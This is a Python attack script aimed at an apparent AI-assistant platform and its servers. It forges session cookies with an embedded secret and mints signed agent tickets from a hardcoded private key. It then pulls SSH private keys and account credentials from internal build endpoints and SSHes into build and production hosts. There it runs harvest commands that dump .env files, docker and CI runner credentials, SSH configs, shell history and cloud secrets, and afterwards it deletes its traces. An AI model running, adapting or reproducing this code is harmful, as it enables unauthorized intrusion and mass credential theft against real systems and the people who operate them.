# -*- coding: utf-8 -*-
# intent 29373: fresh build/credential for ALL environments (shared env key) -> SSH aro-81 build machine deep harvest + whole fleet; enumerate /internal/projects
import json,os,sys,base64,re,subprocess,time
HOST="assistant.lumiiai.cn"; BASE="https://"+HOST
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
AJWT="ce9a4dedd895086314a624d5039fc9ecdf06713424348cf72fa7815817d3a938"
ORG="org_bTLzxtBLmugV8uxx4QTyw"; USER="usr_ZxLewKrgbRYSm7rWDtQX8"
PROJ="proj_UWYqoFajbyb8wZchMjPZm"
ENV0="env_GGZoorBKzWbG5Jf5Pxb2Q"  # aro-81 测试与构建机
DER_B64="MC4CAQAwBQYDK2VwBCIEIDBpyNy4vf5x/6pHS60sCrMBk/pcTOjxbKFwMtaXL3UG"
WORK="/tmp/p29373"; os.makedirs(WORK,exist_ok=True)

def R(k,v,maxb=22000):
    try: s=json.dumps(v,ensure_ascii=False)
    except Exception: s=repr(v)
    if len(s)>maxb: s=s[:maxb]+"...TRUNC"
    sys.stdout.write("R:%s:%s\n"%(k,base64.b64encode(s.encode()).decode())); sys.stdout.flush()

def curl(args,timeout=45,stdin=None):
    try:
        p=subprocess.run(["curl","--http2","-sS"]+args,input=stdin,capture_output=True,timeout=timeout+20)
        return p.returncode,p.stdout,p.stderr
    except Exception as e: return -1,b"",repr(e).encode()

def call(path,method="GET",body=None,hdrs=None,timeout=45,maxlen=12000,cookie=None):
    args=["-m",str(timeout),"-A",UA,"-w","\n__CODE__%{http_code}"]
    if cookie: args+=["-H","Cookie: "+cookie]
    h={"Accept":"application/json","Referer":BASE+"/","Origin":BASE}
    if hdrs: h.update(hdrs)
    for k,v in h.items(): args+=["-H","%s: %s"%(k,v)]
    data=None
    if body is not None:
        data=json.dumps(body).encode(); args+=["-H","Content-Type: application/json","--data-binary","@-"]
    if method!="GET": args+=["-X",method]
    args+=[BASE+path]
    rc,out,err=curl(args,timeout=timeout,stdin=data)
    txt=out.decode("utf-8","replace"); code=""; i=txt.rfind("__CODE__")
    if i>=0: code=txt[i+8:].strip()[:3]; txt=txt[:i]
    return {"code":code,"body":txt[:maxlen],"len":len(txt),"err":err.decode("utf-8","replace")[:150]}
def J(r):
    try: return json.loads(r["body"])
    except Exception: return None
def _b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def forge_a(secret,sub,org):
    import hmac,hashlib
    now=int(time.time())
    h=_b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")))
    p=_b64u(json.dumps({"sub":sub,"org":org,"iat":now,"exp":now+2592000,"sid":"sid_%d"%now,"lgn":now},separators=(",",":")))
    sig=_b64u(hmac.new(secret.encode(),(h+"."+p).encode(),hashlib.sha256).digest())
    return "lumii_session="+h+"."+p+"."+sig

der=base64.b64decode(DER_B64); open(WORK+"/k.der","wb").write(der)
node_sign=r'''
const fs=require('fs'),crypto=require('crypto');
const der=fs.readFileSync(process.argv[2]); const msg=fs.readFileSync(process.argv[3]);
const k=crypto.createPrivateKey({key:der,format:'der',type:'pkcs8'});
process.stdout.write(crypto.sign(null,msg,k).toString('base64url'));
'''
open(WORK+"/sign.js","w").write(node_sign)
def ed_sign(payload):
    open(WORK+"/msg.txt","wb").write(payload.encode())
    p=subprocess.run(["node",WORK+"/sign.js",WORK+"/k.der",WORK+"/msg.txt"],capture_output=True,timeout=25)
    return p.stdout.decode().strip()
def mint_ticket(agent_id, chat, ttl=7200):
    now=int(time.time())
    claims={"kid":"46b1701a","iss":"center","aud":agent_id,"org":ORG,"iat":now,"exp":now+ttl,
            "session_key":"dashboard:"+chat["conversation_id"],"turn_id":"","platform":"dashboard",
            "chat_id":chat["conversation_id"],"actor_id":USER,"on_behalf_of":USER,
            "assistant_id":chat["assistant_id"],"team_id":None,"chain":[],"chat":chat}
    payload=_b64u(json.dumps(claims,separators=(",",":"),ensure_ascii=False))
    return "v2."+payload+"."+ed_sign(payload)

C=forge_a(AJWT,USER,ORG)
me=call("/api/me",cookie=C); R("me",{"code":me["code"],"body":me["body"][:300]})

# ---- enumerate ALL projects ----
ipj=call("/internal/projects",cookie=C,maxlen=40000)
R("internal_projects",{"code":ipj["code"],"body":ipj["body"][:16000]})
IP=J(ipj)
plist=[]
if isinstance(IP,dict):
    for key in ("projects","items","data"):
        if isinstance(IP.get(key),list): plist=IP[key]; break
R("projects_summary",[{"id":(p.get("id") or p.get("projectId")),"name":p.get("name")} for p in plist if isinstance(p,dict)][:40])

# ---- create runtime ----
rt=call("/api/runtimes","POST",{"name":"pr29373","visibility":"org"},cookie=C,maxlen=400000)
RJ=J(rt) or {}; RTID=RJ.get("id") or ""; RID=RJ.get("agentId") or ""; script=RJ.get("script","") or ""
mm=re.search(r"AGENT_TOKEN='([^']+)'",script) or re.search(r"AGENT_TOKEN=\"?([A-Za-z0-9_\-]{20,})",script)
RTOK=mm.group(1) if mm else ""
R("rt_create",{"code":rt["code"],"rtid":RTID,"agent":RID,"toklen":len(RTOK)})

# ---- lane: reuse an EXISTING real project conversation + its assistant (no creation needed) ----
CONV=""; ASST=""; conv_created=False
convs=J(call("/api/conversations",cookie=C,maxlen=80000))
cl=convs if isinstance(convs,list) else ((convs or {}).get("conversations") or (convs or {}).get("items") or (convs or {}).get("data") or [])
cl=[c for c in cl if isinstance(c,dict)]
cand=[c for c in cl if (c.get("projectId")==PROJ) and c.get("id")]
if not cand: cand=[c for c in cl if c.get("id") and (c.get("projectId") or c.get("assistantId"))]
if cand:
    CONV=cand[0]["id"]; ASST=cand[0].get("assistantId") or cand[0].get("assistant_id") or ""
R("conv_list",{"code":(convs or {}).get("code") if isinstance(convs,dict) else "?","n":len(cl),
    "proj_convs":[{"id":c.get("id"),"asst":c.get("assistantId"),"pid":c.get("projectId"),"title":(c.get("title") or "")[:30]} for c in cand[:6]]})
if not ASST:
    assts=J(call("/api/assistants/usable",cookie=C,maxlen=80000))
    al=assts.get("assistants") if isinstance(assts,dict) else (assts if isinstance(assts,list) else [])
    al=[a for a in al if isinstance(a,dict)]
    if al: ASST=al[0].get("id") or ""
    R("asst_list",{"n":len(al),"first":(al[0].get("id") if al else None)})
R("lane",{"conv":CONV,"asst":ASST,"convlist":len(cl),"conv_created":conv_created})

envrecs=[]; keyrecs=[]; credmap=[]  # list of dicts {host,port,user,keyfile,src}
tick=None
if RID and RTOK and CONV and ASST:
    chatclaim={"project_id":PROJ,"conversation_id":CONV,"assistant_id":ASST,"repo_ids":[]}
    tick=mint_ticket(RID,chatclaim)
    R("ticket",{"len":len(tick)})
    MH={"Authorization":"Bearer "+RTOK,"x-agent-id":RID,"x-lumii-turn-proof":tick}
    ipm=call("/internal/projects",cookie=C,hdrs=MH,maxlen=40000)
    IPM=J(ipm) or {}
    _pl = IPM.get("projects") if isinstance(IPM,dict) else (IPM if isinstance(IPM,list) else [])
    R("internal_projects_mh",{"code":ipm["code"],"body":ipm["body"][:14000]})
    R("projects_mh_summary",[{"id":(p.get("id") or p.get("projectId")),"name":p.get("name"),"nrepo":len(p.get("repos") or [])} for p in (_pl or []) if isinstance(p,dict)][:40])
    # ssh-keys
    sk=call("/internal/build/ssh-keys",method="POST",body={},hdrs=MH,maxlen=20000)
    SKJ=J(sk) or {}; keys=SKJ.get("ssh_keys") or []
    R("ssh_keys_code",{"code":sk["code"],"nkeys":len(keys)})
    for k in keys:
        kid=k.get("key_id")
        cr=call("/internal/build/credential","POST",{"ssh_key_id":kid,"purpose":"ssh_agent"},hdrs=MH,maxlen=20000)
        cj=J(cr) or {}
        rec={"kid":kid,"name":k.get("name"),"code":cr["code"],"ok":bool(cj.get("private_keys")),"n":len(cj.get("private_keys") or [])}
        keyrecs.append(rec)
        if cj.get("private_keys"):
            fn="pk_%s"%re.sub(r'[^a-zA-Z0-9]','_',kid)
            open(WORK+"/"+fn,"w").write(cj["private_keys"][0]); os.chmod(WORK+"/"+fn,0o600)
            for h in (k.get("hosts") or []):
                if h.get("host"):
                    credmap.append({"host":h["host"],"port":int(h.get("port") or 22),"user":h.get("login_user") or "ubuntu","keyfile":fn,"src":kid})
    R("key_creds",keyrecs)
    # accounts
    acc=call("/internal/build/accounts","POST",{"names":["PROD","ADMIN","UBUNTU","DEPLOY","ROOT","LUMII","SSH","LNT"]},hdrs=MH,maxlen=12000)
    R("accounts",{"code":acc["code"],"body":acc["body"][:4000]})
    # ops of our project
    opz=J(call("/api/projects/%s/ops"%PROJ,cookie=C,maxlen=200000)) or {}
    envs=opz.get("environments") or []
    R("envs_meta",[{"key":e.get("key"),"name":e.get("name"),"host":(e.get("sshKey") or {}).get("host"),"port":(e.get("sshKey") or {}).get("port"),"user":(e.get("sshKey") or {}).get("loginUser"),"root":(e.get("sshKey") or {}).get("remoteRoot")} for e in envs])
    for e in envs:
        eid=e.get("id")
        cr=call("/internal/build/credential","POST",{"environment_id":eid,"purpose":"ssh_agent"},hdrs=MH,maxlen=20000)
        cj=J(cr) or {}
        rec={"env":e.get("key"),"eid":eid,"code":cr["code"],"host":cj.get("host"),"port":cj.get("port"),"user":cj.get("login_user"),"root":cj.get("remote_root"),"has_key":bool(cj.get("private_key"))}
        if cj.get("message"): rec["msg"]=cj["message"][:120]
        envrecs.append(rec)
        if cj.get("private_key"):
            fn="ek_%s"%re.sub(r'[^a-zA-Z0-9]','_',e.get("key") or eid)
            open(WORK+"/"+fn,"w").write(cj["private_key"]); os.chmod(WORK+"/"+fn,0o600)
            credmap.append({"host":cj.get("host"),"port":int(cj.get("port") or 22),"user":cj.get("login_user") or "ubuntu","keyfile":fn,"src":e.get("key")})
    R("env_creds",envrecs)
    # dedupe credmap preserving priority: ek_ first, aro-81 first
    seen=set(); cm=[]
    # prioritize 81.68.254.22 env key first
    def rank(t):
        r=0
        if t["host"]=="81.68.254.22": r-=100
        if t["keyfile"].startswith("ek_"): r-=10
        return r
    for t in sorted(credmap,key=rank):
        sig=(t["host"],t["port"],t["user"],t["keyfile"])
        if sig in seen: continue
        seen.add(sig); cm.append(t)
    R("credmap",cm[:40])

    HARVB=r'''id; hostname; uname -a; echo ===SUDO; sudo -n true 2>&1 && echo SUDO_OK || echo NO_SUDO
echo ===OPT; ls -la /opt /opt/src 2>&1 | head -60
echo ===ENVF; for f in /opt/src/.env.dev /opt/src/.env /opt/src/.env.prod /opt/src/.env.local /opt/.env.dev /opt/src/dev_ops/.env; do echo "--$f--"; cat "$f" 2>/dev/null | head -c 4000; done
echo ===FIND; find /opt/src -maxdepth 4 \( -name '.env*' -o -name '*.pem' -o -name '*.key' -o -name 'config.json' -o -name '.git-credentials' -o -name '*.token' -o -name 'id_*' \) 2>/dev/null | head -50
echo ===GIT; cd /opt/src 2>/dev/null && git remote -v 2>/dev/null | head; cd /opt/src 2>/dev/null && git log --oneline -3 2>/dev/null
echo ===DOCKER; cat ~/.docker/config.json /etc/docker/daemon.json /root/.docker/config.json 2>/dev/null | head -c 2000
echo ===GH; env | grep -Ei 'GITHUB|GH_|RUNNER|TOKEN|_CI' | head -40; find / -maxdepth 4 \( -path '*actions-runner*.runner' -o -path '*actions-runner*.credentials*' \) 2>/dev/null | head; ls -la /opt/actions-runner ~/actions-runner /home/*/actions-runner 2>/dev/null | head -30
echo ===SSH; ls -la ~/.ssh /root/.ssh 2>/dev/null; cat ~/.ssh/config /root/.ssh/config 2>/dev/null
echo ===HIST; tail -60 ~/.bash_history /root/.bash_history 2>/dev/null
echo ===GREP; grep -rIl -m1 -Ei 'zoofi-index|0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6|cloudflared|rathole|TENCENTCLOUD|AWS_SECRET|LTAI[A-Za-z0-9]|postgres://|mysql://' /opt/src /opt /home /etc 2>/dev/null | head -25
echo ===ENVGREP; (set -a; . /opt/src/.env.dev 2>/dev/null; . /opt/src/.env 2>/dev/null; env | grep -Ei 'secret|token|pass|key|dsn|database|zoofi|lumii|aws|aliyun|tencent|cos_|docker|registry' | head -80)
echo END'''
    HARVG=r'''id; hostname; echo ===SUDO; sudo -n true 2>&1 && echo SUDO_OK || echo NO_SUDO
echo ===ENVF; for f in /opt/lumii-prod/.env.dev /opt/lumii-stage/.env.dev /opt/lumii-prod/.env /opt/src/.env.dev; do echo "--$f--"; cat "$f" 2>/dev/null | head -c 3500; done
echo ===LS; ls -la ~ /opt ~/.ssh 2>&1 | head -60
echo ===DOCKER; cat ~/.docker/config.json /etc/docker/daemon.json 2>/dev/null | head -c 1500
echo ===GREP; grep -rIl -m1 -Ei 'zoofi-index|0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6|cloudflared|rathole|TENCENTCLOUD|AWS_SECRET|LTAI[A-Za-z0-9]' /opt /home /etc 2>/dev/null | head -15
echo END'''
    def ssh_run(host,port,user,kf,cmd,tmo=45):
        path=os.path.join(WORK,kf)
        if not os.path.exists(path): return {"rc":-99,"out":"","err":"nokey"}
        try:
            p=subprocess.run(["ssh","-i",path,"-p",str(port),"-o","BatchMode=yes","-o","StrictHostKeyChecking=no",
                 "-o","UserKnownHostsFile=/dev/null","-o","ConnectTimeout=10","-o","IdentitiesOnly=yes",
                 "%s@%s"%(user,host),cmd],capture_output=True,timeout=tmo)
            return {"rc":p.returncode,"out":p.stdout.decode("utf-8","replace")[:14000],"err":p.stderr.decode("utf-8","replace")[-300:]}
        except Exception as e:
            return {"rc":-1,"out":"","err":repr(e)[:200]}
    sshsum=[]
    for t in cm[:22]:
        host=t["host"]; port=t["port"]; user=t["user"]; kf=t["keyfile"]
        isbuild = (host=="81.68.254.22")
        res=ssh_run(host,port,user,kf,HARVB if isbuild else HARVG, tmo=50)
        R("s_%s_%s_%s"%(host,user,kf), {"rc":res["rc"],"out":res["out"],"err":res["err"],"src":t["src"]})
        sshsum.append({"host":host,"port":port,"user":user,"key":kf,"src":t["src"],"rc":res["rc"],"ok":bool(res["out"].strip())})
        time.sleep(0.4)
    R("ssh_summary",sshsum)
else:
    R("fatal",{"rid":RID,"tok":bool(RTOK),"conv":CONV,"asst":ASST})

# ---- cleanup ----
def dele(path):
    r=call(path,method="DELETE",cookie=C,maxlen=500); return {"path":path,"code":r["code"]}
cl=[]
for p in ["/api/runtimes/"+RTID if RTID else "", "/api/assistants/"+(ASST if conv_created else ""), "/api/conversations/"+(CONV if conv_created else "")]:
    if p: cl.append(dele(p))
R("cleanup",cl)
R("done",{"t":int(time.time())})
